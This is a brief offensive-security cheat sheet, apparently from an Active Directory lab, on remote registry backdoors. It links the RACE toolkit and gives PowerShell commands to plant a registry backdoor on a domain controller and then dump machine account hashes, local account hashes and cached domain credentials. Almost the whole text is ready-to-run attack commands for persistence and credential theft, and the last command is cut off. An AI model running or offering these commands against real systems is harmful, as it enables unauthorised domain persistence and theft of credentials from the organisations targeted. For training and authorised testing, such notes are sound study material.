# Remote Registry

Remote registry changes and backdoors

{% embed url="https://github.com/samratashok/RACE" %}

```
# With admin privs on remote machine, create backdoor
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student572 -Verbose

# As student572, retrieve machine account hash
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose

# Retrieve local account hash
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose

# Retrieve domain cached credentials
Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbos
```

